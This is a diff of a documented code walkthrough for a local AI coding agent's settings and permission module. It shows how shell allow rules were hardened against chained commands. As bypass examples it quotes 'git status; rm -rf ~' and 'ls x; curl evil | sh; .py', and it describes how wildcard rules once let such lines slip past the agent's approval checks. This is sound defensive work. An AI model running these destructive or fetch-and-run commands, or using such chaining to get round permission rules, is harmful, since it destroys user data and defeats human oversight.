@@ -27,11 +27,25 @@ them, safe routine actions just happen, dangerous ones never happen, and only th
   "mcpServers": {
     "files": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "."]}
   },
-  "hooks": {"after_edit": "ruff check {file}", "after_request": "python -m pytest -q"}
+  "hooks": {"after_edit": "ruff check {file}", "after_request": "python -m pytest -q"},
+  "test_command": "npm test",
+  "env": {"LOCALAGENT_MODE": "offline", "LOCALAGENT_GPU_LAYERS": "9"}
 }
 ```
 `hooks` are your own commands run automatically (see `tools.md`): `after_edit` after every file write (a failure is
-shown to the model), `after_request` after every request (shown to you).
+shown to the model), `after_request` after every request (shown to you). `{file}` is replaced by the file's name,
+quoted when needed — do not add quotes yourself.
+`test_command` is what `run_tests` runs; without it the agent picks pytest, unittest, `npm test`, `go test` or
+`cargo test` itself (see `runners.md`).
+`env` sets environment variables — any `LOCALAGENT_*` setting from `05-user-manual.md` — for every run, unless the
+variable is already set (a real variable wins). Put a Gemini key only in the **user** file: a project file may end up
+in git.
+
+**Command lines with several commands.** A rule such as `run_shell(git *)` approves `git status`. Before version 0.6 it
+also approved `git status; rm -rf ~`, because `*` matches anything — including a second command. Now a command line is
+split at `&&`, `||`, `;`, `|` and `&`, and **every** part must match an allow rule (and no part a deny rule). Lines with
+command substitution (`$(...)`, backticks), parentheses (PowerShell runs `(...)` as a command), redirection (`<`, `>`)
+or several lines are always asked — unless you answered "always" to exactly that line before.
 
 | Tool name in rules | Subject matched by the pattern in brackets |
 |---|---|
@@ -57,72 +71,108 @@ Patterns use shell-style wildcards: `*` any text, `?` one character. Matching is
  10 |                    "deny":  ["run_shell(*rm *)", "run_shell(*--force*)"]},
  11 |    "mcpServers": {"files": {"command": "npx",
  12 |                             "args": ["-y", "@modelcontextprotocol/server-filesystem", "."]}},
- 13 |    "hooks": {"after_edit": "ruff check {file}", "after_request": "python -m pytest -q"}}
- 14 | 
- 15 | A rule is a tool name (wildcards allowed, e.g. ``mcp__files__*``), optionally followed by
- 16 | a pattern in brackets that must match the action's subject: the command line for
- 17 | run_shell, the file for run_python, the URL for fetch_url, the arguments for MCP tools.
- 18 | Deny rules win over allow rules; an action that matches neither is asked.
- 19 | """
- 20 | from __future__ import annotations
- 21 | 
- 22 | import json
- 23 | import re
- 24 | from dataclasses import dataclass, field
- 25 | from fnmatch import fnmatchcase
- 26 | from pathlib import Path
- 27 | from urllib.parse import urlsplit
- 28 | 
- 29 | USER_SETTINGS = Path.home() / ".localagent" / "settings.json"
- 30 | PROJECT_SETTINGS = Path(".localagent") / "settings.json"     # relative to the workspace
- 31 | USER_COMMANDS = Path.home() / ".localagent" / "commands"     # custom slash commands (*.md)
- 32 | PROJECT_COMMANDS = Path(".localagent") / "commands"
- 33 | 
- 34 | 
+ 13 |    "hooks": {"after_edit": "ruff check {file}", "after_request": "python -m pytest -q"},
+ 14 |    "test_command": "npm test",
+ 15 |    "env": {"LOCALAGENT_MODE": "offline"}}
+ 16 | 
+ 17 | A rule is a tool name (wildcards allowed, e.g. ``mcp__files__*``), optionally followed by
+ 18 | a pattern in brackets that must match the action's subject: the command line for
+ 19 | run_shell, the file for run_python, the URL for fetch_url, the arguments for MCP tools.
+ 20 | Deny rules win over allow rules; an action that matches neither is asked. A shell command
+ 21 | line made of several commands (``a && b``, ``a; b``, ``a | b``) is allowed only when every
+ 22 | part is; one with command substitution, grouping, redirection or several lines is always
+ 23 | asked, unless an "always" answer approved exactly that line.
+ 24 | ``env`` sets environment variables (any ``LOCALAGENT_*`` setting) unless they are already set.
+ 25 | """
+ 26 | from __future__ import annotations
+ 27 | 
+ 28 | import json
+ 29 | import os
+ 30 | import re
+ 31 | from dataclasses import dataclass, field
+ 32 | from fnmatch import fnmatchcase
+ 33 | from pathlib import Path
+ 34 | from urllib.parse import urlsplit
+ 35 | 
+ 36 | USER_SETTINGS = Path.home() / ".localagent" / "settings.json"
+ 37 | PROJECT_SETTINGS = Path(".localagent") / "settings.json"     # relative to the workspace
+ 38 | USER_COMMANDS = Path.home() / ".localagent" / "commands"     # custom slash commands (*.md)
+ 39 | PROJECT_COMMANDS = Path(".localagent") / "commands"
+ 40 | SHELL_SPLIT = re.compile(r"&&|\|\||[;&|]")                     # between two commands
+ 41 | SHELL_UNSAFE = ("`", "$(", "(", ")", "<", ">", "\n", "\r")    # hide or redirect commands
+ 42 | ESCAPED = re.compile(r"\[[*?\[]\]")                            # [*] [?] [[] = literal characters
+ 43 | 
+ 44 | 
 ```
-- The docstring is the user guide in brief. `json` reads and writes the files; `dataclass`/`field` build
-  `Permissions`; `fnmatchcase` matches wildcards (case-sensitive on every system, so a rule means the same on Windows
-  and Linux); `urlsplit` takes a URL apart for website rules.
+- The docstring is the user guide in brief. `json` reads and writes the files; `os` sets environment variables;
+  `dataclass`/`field` build `Permissions`; `fnmatchcase` matches wildcards (case-sensitive on every system, so a rule
+  means the same on Windows and Linux); `urlsplit` takes a URL apart for website rules.
 - `USER_SETTINGS` and `PROJECT_SETTINGS` are the two file locations (the project one is relative to the workspace);
   `USER_COMMANDS` and `PROJECT_COMMANDS` the folders for custom slash commands. `re` checks command names.
+- `SHELL_SPLIT` finds the places between two commands (`&&`, `||`, `;`, `|`, `&`); `SHELL_UNSAFE` lists the marks that
+  can hide or redirect a command; `ESCAPED` recognises the escapes `[*]`, `[?]` and `[[]` (a wildcard character made
+  literal).
 
 ## Reading the files
 ```python
- 35 | def read_json(path: Path) -> dict:
- 36 |     """A settings file as a dict; a missing file is empty, a broken one is an error."""
- 37 |     if not path.is_file():
- 38 |         return {}
- 39 |     try:
- 40 |         data = json.loads(path.read_text(encoding="utf-8"))
- 41 |     except (ValueError, OSError) as exc:
- 42 |         raise ValueError(f"{path}: not valid JSON ({exc})") from None
- 43 |     if not isinstance(data, dict):
- 44 |         raise ValueError(f"{path}: must contain a JSON object {{...}}")
- 45 |     return data
- 46 | 
- 47 | 
+ 45 | def read_json(path: Path) -> dict:
+ 46 |     """A settings file as a dict; a missing file is empty, a broken one is an error."""
+ 47 |     if not path.is_file():
+ 48 |         return {}
+ 49 |     try:
+ 50 |         data = json.loads(path.read_text(encoding="utf-8"))
+ 51 |     except (ValueError, OSError) as exc:
+ 52 |         raise ValueError(f"{path}: not valid JSON ({exc})") from None
+ 53 |     if not isinstance(data, dict):
+ 54 |         raise ValueError(f"{path}: must contain a JSON object {{...}}")
+ 55 |     return data
+ 56 | 
+ 57 | 
 ```
 - A missing file is simply "no settings". A file that is not valid JSON, or not a `{...}` object, is an **error** with
   the file name — silently ignoring a broken file could silently drop your deny rules.
 
 ```python
- 48 | def load_settings(workspace: Path, user_file: Path = USER_SETTINGS) -> dict:
- 49 |     """Merge the user and project settings files into one dict."""
- 50 |     merged: dict = {"permissions": {"allow": [], "deny": []}, "mcpServers": {}, "hooks": {}}
- 51 |     for path in (user_file, workspace / PROJECT_SETTINGS):
- 52 |         data = read_json(path)
- 53 |         rules = data.get("permissions", {})
- 54 |         for kind in ("allow", "deny"):
- 55 |             merged["permissions"][kind] += [str(rule) for rule in rules.get(kind, [])]
- 56 |         merged["mcpServers"].update(data.get("mcpServers", {}))
- 57 |         merged["hooks"].update(data.get("hooks", {}))           # project hooks replace user ones
- 58 |     return merged
- 59 | 
- 60 | 
+ 58 | def load_settings(workspace: Path, user_file: Path = USER_SETTINGS) -> dict:
+ 59 |     """Merge the user and project settings files into one dict (project values win)."""
+ 60 |     merged: dict = {"permissions": {"allow": [], "deny": []}, "mcpServers": {}, "hooks": {},
+ 61 |                     "env": {}, "test_command": ""}
+ 62 |     for path in (user_file, workspace / PROJECT_SETTINGS):
+ 63 |         data = read_json(path)
+ 64 |         rules = data.get("permissions", {})
+ 65 |         for kind in ("allow", "deny"):
+ 66 |             merged["permissions"][kind] += [str(rule) for rule in rules.get(kind, [])]
+ 67 |         merged["mcpServers"].update(data.get("mcpServers", {}))
+ 68 |         merged["hooks"].update(data.get("hooks", {}))           # project hooks replace user ones
+ 69 |         merged["env"].update({str(k): str(v) for k, v in data.get("env", {}).items()})
+ 70 |         merged["test_command"] = str(data.get("test_command") or merged["test_command"])
+ 71 |     return merged
+ 72 | 
+ 73 | 
 ```
 - Starts from empty lists, then adds the user file's rules and the project file's rules (both kinds simply
-  accumulate, so a project cannot remove a user's deny rule). MCP server definitions and hooks are merged by name (the
-  project wins on a clash).
+  accumulate, so a project cannot remove a user's deny rule). MCP server definitions, hooks and `env` variables are
+  merged by name (the project wins on a clash); a project's `test_command` replaces the user's.
+
+```python
+ 74 | def apply_env(settings: dict) -> list[str]:
+ 75 |     """Set the settings' ``env`` variables that are not set already; returns their names.
+ 76 | 
+ 77 |     A real environment variable wins, so ``setx`` (or a one-off ``$env:X=...``) still overrides
+ 78 |     a settings file.
+ 79 |     """
+ 80 |     applied = []
+ 81 |     for name, value in settings.get("env", {}).items():
+ 82 |         if name not in os.environ:
+ 83 |             os.environ[name] = value
+ 84 |             applied.append(name)
+ 85 |     return applied
+ 86 | 
+ 87 | 
+```
+- Sets each `env` variable that is not set yet and returns the names it set. The CLI calls it **before** reading the
+  configuration, so `"env": {"LOCALAGENT_MODE": "offline"}` works exactly like `setx LOCALAGENT_MODE offline` — but a
+  variable you really set (with `setx`, or `$env:X = ...` for one terminal) still wins.
 
 ## Custom slash commands
 Like Claude Code's custom commands: put a Markdown file in `<project>\.localagent\commands\` (or
@@ -135,120 +185,179 @@ list the problems with file:line and a suggested fix.
 Then `/review src/app.py`. The first line of the file is shown in `/help`.
 
 ```python
- 61 | def load_commands(workspace: Path, user_dir: Path = USER_COMMANDS) -> dict[str, str]:
- 62 |     """Custom slash commands: each ``<name>.md`` file becomes ``/<name>`` (project files win)."""
- 63 |     commands: dict[str, str] = {}
- 64 |     for folder in (user_dir, workspace / PROJECT_COMMANDS):
- 65 |         if folder.is_dir():
- 66 |             for path in sorted(folder.glob("*.md")):
- 67 |                 name = path.stem.lower()
- 68 |                 if re.fullmatch(r"[a-z0-9_-]+", name):            # simple, typeable names only
- 69 |                     commands[name] = path.read_text(encoding="utf-8", errors="replace")
- 70 |     return commands
- 71 | 
- 72 | 
+ 88 | def load_commands(workspace: Path, user_dir: Path = USER_COMMANDS) -> dict[str, str]:
+ 89 |     """Custom slash commands: each ``<name>.md`` file becomes ``/<name>`` (project files win)."""
+ 90 |     commands: dict[str, str] = {}
+ 91 |     for folder in (user_dir, workspace / PROJECT_COMMANDS):
+ 92 |         if folder.is_dir():
+ 93 |             for path in sorted(folder.glob("*.md")):
+ 94 |                 name = path.stem.lower()
+ 95 |                 if re.fullmatch(r"[a-z0-9_-]+", name):            # simple, typeable names only
+ 96 |                     commands[name] = path.read_text(encoding="utf-8", errors="replace")
+ 97 |     return commands
+ 98 | 
+ 99 | 
 ```
 - Reads every `*.md` file from the user folder, then the project folder (so a project command replaces a user command
   of the same name). Only simple names (letters, digits, `-`, `_`) become commands.
 
 ```python
- 73 | def expand_command(template: str, arguments: str) -> str:
- 74 |     """Put the words typed after the command where the file says $ARGUMENTS (else at the end)."""
- 75 |     if "$ARGUMENTS" in template:
- 76 |         return template.replace("$ARGUMENTS", arguments).strip()
- 77 |     return (template.rstrip() + ("\n\n" + arguments if arguments else "")).strip()
- 78 | 
- 79 | 
+100 | def expand_command(template: str, arguments: str) -> str:
+101 |     """Put the words typed after the command where the file says $ARGUMENTS (else at the end)."""
+102 |     if "$ARGUMENTS" in template:
+103 |         return template.replace("$ARGUMENTS", arguments).strip()
+104 |     return (template.rstrip() + ("\n\n" + arguments if arguments else "")).strip()
+105 | 
+106 | 
 ```
 - Replaces `$ARGUMENTS` with the typed words; a file without `$ARGUMENTS` gets the words appended as a new paragraph.
 
 ## Rules
 ```python
- 80 | def parse_rule(rule: str) -> tuple[str, str | None]:
- 81 |     """``"run_shell(git *)"`` -> ``("run_shell", "git *")``; ``"run_tests"`` -> ``("run_tests", None)``."""
- 82 |     rule = rule.strip()
- 83 |     if rule.endswith(")") and "(" in rule:
- 84 |         name, _, pattern = rule.partition("(")
- 85 |         return name.strip(), pattern[:-1]
- 86 |     return rule, None
- 87 | 
- 88 | 
+107 | def parse_rule(rule: str) -> tuple[str, str | None]:
+108 |     """``"run_shell(git *)"`` -> ``("run_shell", "git *")``; ``"run_tests"`` -> ``("run_tests", None)``."""
+109 |     rule = rule.strip()
+110 |     if rule.endswith(")") and "(" in rule:
+111 |         name, _, pattern = rule.partition("(")
+112 |         return name.strip(), pattern[:-1]
+113 |     return rule, None
+114 | 
+115 | 
 ```
 - Splits `run_shell(git *)` into the tool name and the pattern; a bare name has no pattern.
 
 ```python
- 89 | def matches(rule: str, tool: str, subject: str) -> bool:
- 90 |     """True when ``rule`` covers this tool and subject (shell-style wildcards)."""
- 91 |     name, pattern = parse_rule(rule)
- 92 |     if not fnmatchcase(tool, name):
- 93 |         return False
- 94 |     return pattern is None or fnmatchcase(subject, pattern)
- 95 | 
- 96 | 
+116 | def matches(rule: str, tool: str, subject: str) -> bool:
+117 |     """True when ``rule`` covers this tool and subject (shell-style wildcards)."""
+118 |     name, pattern = parse_rule(rule)
+119 |     if not fnmatchcase(tool, name):
+120 |         return False
+121 |     return pattern is None or fnmatchcase(subject, pattern)
+122 | 
+123 | 
 ```
 - The tool name is matched with wildcards (so `mcp__files__*` covers all of that server's tools); without a pattern
   the rule covers every subject.
 
 ```python
- 97 | def suggest_rule(tool: str, subject: str) -> str:
- 98 |     """The rule an "always allow" answer saves: narrow enough to stay safe."""
- 99 |     if tool == "run_shell" or tool == "run_python":
-100 |         return f"{tool}({subject})"                     # exactly this command / file
-101 |     if tool == "fetch_url":
-102 |         parts = urlsplit(subject)
-103 |         return f"fetch_url({parts.scheme}://{parts.netloc}/*)"   # this website
-104 |     return tool                                         # run_tests, one MCP tool
-105 | 
-106 | 
+124 | def escape_pattern(text: str) -> str:
+125 |     """``text`` as a rule pattern that matches only itself (``*``, ``?`` and ``[`` made literal)."""
+126 |     return "".join(f"[{char}]" if char in "*?[" else char for char in text)
+127 | 
+128 | 
 ```
-- What an "always" answer saves — deliberately narrow: exactly this command or this file for shell/python, the whole
-  website for `fetch_url` (scheme + host + `/*`), and the bare name for `run_tests` and MCP tools.
+- Turns text into a pattern that matches only that text: `*`, `?` and `[` become `[*]`, `[?]` and `[[]`. Before 0.6 an
+  "always" answer to `ls *.py` saved the rule `run_shell(ls *.py)`, whose `*` then also matched
+  `ls x; curl evil | sh; .py`.
+
+```python
+129 | def is_exact(pattern: str | None) -> bool:
+130 |     """True for a pattern without wildcards, such as the ones "always" answers save."""
+131 |     return pattern is not None and not any(char in ESCAPED.sub("", pattern) for char in "*?[")
+132 | 
+133 | 
+```
+- True for a pattern without wildcards once the escapes are removed — the kind an "always" answer saves.
+
+```python
+134 | def command_parts(command: str) -> list[str] | None:
+135 |     """The simple commands in a command line (``git add . && git commit`` gives two), or None
+136 |     when it holds something a rule cannot vouch for: command substitution (``$(...)``,
+137 |     backticks), grouping (PowerShell runs ``(...)`` as a command), redirection or several lines.
+138 | 
+139 |     Splitting is deliberately simple: an operator inside quotes also splits, which can only
+140 |     make the agent ask more often, never less.
+141 |     """
+142 |     if any(mark in command for mark in SHELL_UNSAFE):
+143 |         return None
+144 |     return [part.strip() for part in SHELL_SPLIT.split(command) if part.strip()]
+145 | 
+146 | 
+```
+- Splits a command line into its simple commands, or returns `None` when it contains a mark from `SHELL_UNSAFE`. The
+  split is deliberately simple: an operator inside quotes (`git commit -m "a; b"`) also splits, which can only make the
+  agent ask *more* often, never less.
+
+```python
+147 | def suggest_rule(tool: str, subject: str) -> str:
+148 |     """The rule an "always allow" answer saves: narrow enough to stay safe."""
+149 |     if tool == "run_shell" or tool == "run_python":
+150 |         return f"{tool}({escape_pattern(subject)})"     # exactly this command / file
+151 |     if tool == "fetch_url":
+152 |         parts = urlsplit(subject)
+153 |         return f"fetch_url({parts.scheme}://{parts.netloc}/*)"   # this website
+154 |     return tool                                         # run_tests, one MCP tool
+155 | 
+156 | 
+```
+- What an "always" answer saves — deliberately narrow: exactly this command or this file for shell/python (escaped, so
+  it stays exact), the whole website for `fetch_url` (scheme + host + `/*`), and the bare name for `run_tests` and MCP
+  tools.
 
 ## `Permissions`
 ```python
-107 | @dataclass
-108 | class Permissions:
-109 |     """Allow/deny rules plus the project file where new "always" rules are saved."""
-110 | 
-111 |     allow: list[str] = field(default_factory=list)
-112 |     deny: list[str] = field(default_factory=list)
-113 |     project_file: Path | None = None
-114 | 
+157 | @dataclass
+158 | class Permissions:
+159 |     """Allow/deny rules plus the project file where new "always" rules are saved."""
+160 | 
+161 |     allow: list[str] = field(default_factory=list)
+162 |     deny: list[str] = field(default_factory=list)
+163 |     project_file: Path | None = None
+164 | 
 ```
 ```python
-115 |     @classmethod
-116 |     def from_settings(cls, settings: dict, project_file: Path | None = None) -> "Permissions":
-117 |         rules = settings.get("permissions", {})
-118 |         return cls(list(rules.get("allow", [])), list(rules.get("deny", [])), project_file)
-119 | 
+165 |     @classmethod
+166 |     def from_settings(cls, settings: dict, project_file: Path | None = None) -> "Permissions":
+167 |         rules = settings.get("permissions", {})
+168 |         return cls(list(rules.get("allow", [])), list(rules.get("deny", [])), project_file)
+169 | 
 ```
 ```python
-120 |     def decide(self, tool: str, subject: str) -> str:
-121 |         """``"deny"``, ``"allow"`` or ``"ask"`` for this action."""
-122 |         if any(matches(rule, tool, subject) for rule in self.deny):
-123 |             return "deny"
-124 |         if any(matches(rule, tool, subject) for rule in self.allow):
-125 |             return "allow"
-126 |         return "ask"
-127 | 
+170 |     def decide(self, tool: str, subject: str) -> str:
+171 |         """``"deny"``, ``"allow"`` or ``"ask"`` for this action."""
+172 |         if any(matches(rule, tool, subject) for rule in self.deny):
+173 |             return "deny"
+174 |         if tool != "run_shell":
+175 |             return "allow" if any(matches(rule, tool, subject) for rule in self.allow) else "ask"
+176 |         for rule in self.allow:                 # every command allowed, or exactly this line
+177 |             name, pattern = parse_rule(rule)
+178 |             if fnmatchcase(tool, name) and (pattern in (None, "*") or (
+179 |                     is_exact(pattern) and fnmatchcase(subject, pattern or ""))):
+180 |                 return "allow"
+181 |         parts = command_parts(subject)
+182 |         if not parts:
+183 |             return "ask"
+184 |         if any(matches(rule, tool, part) for part in parts for rule in self.deny):
+185 |             return "deny"
+186 |         if all(any(matches(rule, tool, part) for rule in self.allow) for part in parts):
+187 |             return "allow"
+188 |         return "ask"
+189 | 
 ```
 ```python
-128 |     def always_allow(self, rule: str) -> Path | None:
-129 |         """Allow ``rule`` from now on and save it in the project settings (if any)."""
-130 |         if rule not in self.allow:
-131 |             self.allow.append(rule)
-132 |         if self.project_file is None:
-133 |             return None
-134 |         data = read_json(self.project_file)
-135 |         saved = data.setdefault("permissions", {}).setdefault("allow", [])
-136 |         if rule not in saved:
-137 |             saved.append(rule)
-138 |         self.project_file.parent.mkdir(parents=True, exist_ok=True)
-139 |         self.project_file.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
-140 |         return self.project_file
+190 |     def always_allow(self, rule: str) -> Path | None:
+191 |         """Allow ``rule`` from now on and save it in the project settings (if any)."""
+192 |         if rule not in self.allow:
+193 |             self.allow.append(rule)
+194 |         if self.project_file is None:
+195 |             return None
+196 |         data = read_json(self.project_file)
+197 |         saved = data.setdefault("permissions", {}).setdefault("allow", [])
+198 |         if rule not in saved:
+199 |             saved.append(rule)
+200 |         self.project_file.parent.mkdir(parents=True, exist_ok=True)
+201 |         self.project_file.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
+202 |         return self.project_file
 ```
 - Holds the allow and deny lists and the project file for saving.
 - `from_settings` builds it from merged settings (copies, so changes do not touch the input).
-- `decide` checks deny first (deny always wins), then allow, else `"ask"`.
+- `decide` checks deny first (deny always wins, matched against the whole subject). For every tool except `run_shell`
+  that is followed by the allow rules, else `"ask"`. For `run_shell`:
+  1. a rule allowing every command (`run_shell` or `run_shell(*)`) or an exact rule equal to this line allows it — so
+     an "always" answer to `pytest -q | tail -5` keeps working although it contains a pipe;
+  2. otherwise the line is split by `command_parts`; a line that cannot be split (substitution, redirection, several
+     lines) is asked;
+  3. any part matching a deny rule refuses the whole line; when every part matches an allow rule it is allowed;
+     anything else is asked.
 - `always_allow` adds the rule for this session and — if there is a project file — re-reads that file, adds the rule
   once, creates the folder if needed and writes it back nicely indented. It returns where it saved (for the message).
